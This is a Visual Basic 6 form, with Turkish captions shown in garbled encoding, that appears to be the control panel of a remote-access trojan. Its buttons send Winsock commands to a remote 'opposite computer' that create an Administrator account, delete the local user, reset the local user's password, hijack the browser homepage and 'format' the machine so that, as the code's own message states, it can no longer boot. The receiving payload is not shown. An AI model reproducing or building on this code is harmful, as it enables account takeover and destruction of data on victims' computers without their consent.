VERSION 5.00
Begin VB.Form Form5 
   BackColor       =   &H80000007&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Windows Yönetim"
   ClientHeight    =   5775
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   4695
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5775
   ScaleWidth      =   4695
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command6 
      Caption         =   "Ana Sayfayý Deðiþtir"
      Height          =   375
      Left            =   1080
      TabIndex        =   18
      Top             =   4080
      Width           =   2415
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BackColor       =   &H80000007&
      ForeColor       =   &H0000FF00&
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   240
      TabIndex        =   17
      Text            =   "http://www.google.com/"
      Top             =   3720
      Width           =   4095
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H80000007&
      Caption         =   "Ýnternet Explorer Ana Sayfasýný Deðiþtir"
      ForeColor       =   &H0000FF00&
      Height          =   1335
      Left            =   120
      TabIndex        =   15
      Top             =   3240
      Width           =   4455
      Begin VB.Label Label6 
         BackColor       =   &H80000007&
         Caption         =   "Deðiþtirmek istediðiniz ana sayfa adresini yazýn.  "
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   240
         Width           =   3975
      End
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Karþý Bilgisayarý Formatla"
      Height          =   375
      Left            =   1080
      TabIndex        =   14
      Top             =   5160
      Width           =   2415
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H80000007&
      Caption         =   "FORMAT AT"
      ForeColor       =   &H0000FF00&
      Height          =   975
      Left            =   120
      TabIndex        =   12
      Top             =   4680
      Width           =   4455
      Begin VB.Label Label4 
         BackColor       =   &H00000000&
         Caption         =   "BUNU YAPTIÐINIZDA KARÞI BÝLGÝSAYAR SÝLÝNÝR..."
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   360
         TabIndex        =   13
         Top             =   240
         Width           =   3975
      End
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Kullanýcý Sil"
      Height          =   375
      Left            =   3120
      TabIndex        =   11
      Top             =   1200
      Width           =   1215
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H80000007&
      ForeColor       =   &H0000FF00&
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   240
      PasswordChar    =   "*"
      TabIndex        =   4
      Top             =   2280
      Width           =   4095
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Yerel Kullanýcý Þifresini Deðiþtir"
      Height          =   375
      Left            =   240
      TabIndex        =   5
      Top             =   2640
      Width           =   2415
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Yerel Kullanýcýyý Sil"
      Height          =   375
      Left            =   2760
      TabIndex        =   6
      Top             =   2640
      Width           =   1575
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000007&
      Caption         =   "Windows Kullanýcýsý Ayarlarý"
      ForeColor       =   &H0000FF00&
      Height          =   1335
      Left            =   120
      TabIndex        =   9
      Top             =   1800
      Width           =   4455
      Begin VB.Label Label3 
         BackColor       =   &H00000000&
         Caption         =   "Deðiþtirmek istediðiniz Yerel Kullanýcý þifresini yazýn."
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   4215
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Kullanýcý Oluþtur"
      Height          =   375
      Left            =   1680
      TabIndex        =   3
      Top             =   1200
      Width           =   1335
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000007&
      ForeColor       =   &H0000FF00&
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   1680
      PasswordChar    =   "*"
      TabIndex        =   2
      Top             =   840
      Width           =   2655
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000007&
      Enabled         =   0   'False
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   1680
      TabIndex        =   1
      Text            =   "Yönetici"
      Top             =   480
      Width           =   2655
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      Caption         =   "Windows Kullanýcý Oluþturma"
      ForeColor       =   &H0000FF00&
      Height          =   1575
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4455
      Begin VB.Label Label2 
         BackColor       =   &H80000007&
         Caption         =   "Parola : "
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   240
         TabIndex        =   8
         Top             =   720
         Width           =   1095
      End
      Begin VB.Label Label1 
         BackColor       =   &H80000007&
         Caption         =   "Kullanýcý Adý : "
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   240
         TabIndex        =   7
         Top             =   360
         Width           =   1335
      End
   End
End
Attribute VB_Name = "Form5"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
If Text2.Text = "" Then
MsgBox "Lütfen Bir Þifre Yazýnýz", vbCritical, "Windows Yönetim"
Else
Form1.Winsock1.SendData "kullanici_olustur|" + Text2.Text
MsgBox "Yeni bir kullanýcý Administrator yetkisiyle oluþturuldu.", vbInformation, "Windows Yönetim"
End If
End Sub

Private Sub Command2_Click()
On Error Resume Next
Form1.Winsock1.SendData "yerel_kullanici_sil"
MsgBox "Yerel Kullanýcý Silindi.", vbInformation, "Windows Yönetim"
End Sub


Private Sub Command3_Click()
On Error Resume Next
Form1.Winsock1.SendData "olusturulan_kullanici_sil"
MsgBox "Oluþturulan Kullanýcý Silindi.", vbInformation, "Windows Yönetim"
End Sub

Private Sub Command4_Click()
On Error Resume Next
If Text3.Text = "" Then
MsgBox "Lütfen Bir Þifre Yazýnýz", vbCritical, "Windows Yönetim"
Else
Form1.Winsock1.SendData "yerel_kullanici_sifresi|" + Text3.Text
MsgBox "Yerel Kullanýcý Þifresi Deðiþtirildi.", vbInformation, "Windows Yönetim"
End If
End Sub


Private Sub Command5_Click()
On Error Resume Next
If MsgBox("Karþý bilgisayarý formatlamak istediðinize emin misiniz?", vbYesNo, "Windows Yönetim") = vbYes Then
Form1.Winsock1.SendData "format_cek"
MsgBox "Karþý bilgisayara format atýldý artýk o bilgisayar açýlamaz.", vbInformation, "Windows Yönetim"
Else
MsgBox "Karþý bilgisayar formatlanmadý.", vbInformation, "Windows Yönetim"
End If
End Sub

Private Sub Command6_Click()
On Error Resume Next
Form1.Winsock1.SendData "internet_ac|" + Text4.Text
End Sub

Private Sub Text3_Click()
Text3.Text = ""
End Sub
